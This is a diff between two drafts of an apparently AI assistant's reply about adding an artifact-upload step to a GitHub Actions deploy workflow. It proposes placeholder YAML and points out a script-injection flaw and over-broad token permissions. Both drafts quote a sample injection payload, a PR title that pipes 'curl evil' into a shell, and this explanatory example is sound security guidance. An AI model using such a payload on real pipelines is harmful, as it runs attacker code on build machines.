@@ -1,48 +1,36 @@
-I didn't change anything. The workflow has no test or build step to attach an upload to, and I don't have a file-editing tool in this session.
+I couldn't add the step. There are two blockers, and I also found two security problems in the workflow.
 
-`.github/workflows/deploy.yml` contains only this:
+**Blockers**
 
-```yaml
-on:
-  pull_request:
+1. **There are no tests or build in this workflow.** `.github/workflows/deploy.yml` has only two steps: a checkout and an `echo`. Nothing produces an artifact and nothing runs tests, so there's no point to add an upload "after the tests pass." Which commands run your tests and build, and where does the build output go (e.g. `dist/`)?
+2. **I can't edit files in this session.** I only have read and search tools here, so I can't make the change myself. Below is what I'd add once I know the commands.
 
-permissions: write-all
-
-jobs:
-  deploy:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - run: echo "Title is ${{ github.event.pull_request.title }}"
-```
-
-There's no test step, no build step, and nothing is produced to upload. To add "upload after tests pass," I need to know:
-
-1. **How tests run.** For example `make test`, `uv run pytest` or `npm test`.
-2. **How the artifact is built and where it ends up.** For example `dist/` or `build/app.tar.gz`.
-
-Once I have those, this is roughly what the new steps would look like (placeholders in angle brackets):
+**Proposed step** (after your test and build steps):
 
 ```yaml
-      - run: <test command>
-      - run: <build command>
-      - uses: actions/upload-artifact@v4
+      - name: Run tests
+        run: <your test command>
+      - name: Build
+        run: <your build command>
+      - name: Upload build artifact
+        uses: actions/upload-artifact@v4  # pin to a full commit SHA
         with:
           name: build
-          path: <artifact path>
+          path: <your build output dir>
           if-no-files-found: error
+          retention-days: 7
 ```
 
-Steps in a job run in order and stop at the first failure, so the upload only happens if the tests pass. Ideally, pin each `uses:` to a full commit SHA rather than `@v4`.
+A step only runs if every earlier step succeeded, so a failing test will skip the upload without needing an `if:` condition.
 
-There are also two security problems in this file that I'd recommend fixing in the same change:
+**Security problems in the existing file** (worth fixing in the same change):
 
-- **Script injection (line 14).** `${{ github.event.pull_request.title }}` is pasted straight into the shell script. A PR titled something like `"; curl evil | sh; #` would run as code. The safe pattern is to pass the title through an environment variable:
+- **Line 14, script injection:** `run: echo "Title is ${{ github.event.pull_request.title }}"` puts the PR title straight into the shell script. Anyone who can open a PR can run commands by choosing a title like `"; curl evil | sh; #`. Pass it in as an environment variable instead:
   ```yaml
       - env:
           PR_TITLE: ${{ github.event.pull_request.title }}
         run: echo "Title is ${PR_TITLE}"
   ```
-- **`permissions: write-all` (line 7).** This is too broad for a workflow triggered by PRs, especially combined with the injection above. Uploading artifacts doesn't need any special token scope, so `permissions: contents: read` should be enough.
+- **Line 7, `permissions: write-all`:** this gives the job's token far more access than it needs. Uploading an artifact doesn't need any write scope, so `permissions: contents: read` is enough.
 
-Send me the test and build details and I'll write out the complete updated file for you to apply.
+Send me the test and build commands and the output path and I'll write out the full updated `deploy.yml`.
